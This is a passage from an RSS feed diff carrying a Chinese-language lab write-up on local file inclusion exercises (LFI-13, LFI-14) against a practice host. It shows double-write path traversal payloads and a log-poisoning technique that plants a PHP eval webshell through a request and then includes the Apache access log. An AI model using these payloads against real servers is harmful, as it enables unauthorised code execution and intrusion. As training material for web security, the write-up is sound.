+&lt;p&gt;&lt;img src=&#34;image-20221020011415134.png&#34; alt=&#34;image-20221020011415134&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;lfi-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-13&#34;&gt;#&lt;/a&gt; LFI-13&lt;/h2&gt;
+&lt;p&gt;依旧是双写：&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-13/?file=..././..././..././phpinfo.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020011537265.png&#34; alt=&#34;image-20221020011537265&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;lfi-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-14&#34;&gt;#&lt;/a&gt; LFI-14&lt;/h2&gt;
+&lt;p&gt;变成了 &lt;code&gt;POST&lt;/code&gt;  型，使用双写绕过：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;file=..././..././..././phpinfo.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020011651144.png&#34; alt=&#34;image-20221020011651144&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;包含日志文件获取webshell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#包含日志文件获取webshell&#34;&gt;#&lt;/a&gt; 包含日志文件获取 webshell&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020011757179.png&#34; alt=&#34;image-20221020011757179&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们通过 &lt;code&gt;httpd-vhosts.conf&lt;/code&gt;  可以知道：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020012214942.png&#34; alt=&#34;image-20221020012214942&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们的网页日志存储在 &lt;code&gt;logs/dummy-host2.asdf-access.log&lt;/code&gt;  中&lt;/p&gt;
+&lt;p&gt;那么我们通过文件包含去请求一句话木马，看是否会留下痕迹？&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-1/?page=&amp;lt;?php phpinfo();?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;那我们构造：&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-1/?page=&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php @eval($_POST[jack]);?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;接着查看：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-1/?page=../../../Apache/logs/dummy-host2.asdf-access.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020013521115.png&#34; alt=&#34;image-20221020013521115&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现 &lt;code&gt;尖括号&lt;/code&gt; 和 &lt;code&gt;空格&lt;/code&gt; 会被 URL 编码，这时候我们使用 &lt;code&gt;BP&lt;/code&gt;  抓包修改&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020013627512.png&#34; alt=&#34;image-20221020013627512&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020014143191.png&#34; alt=&#34;image-20221020014143191&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
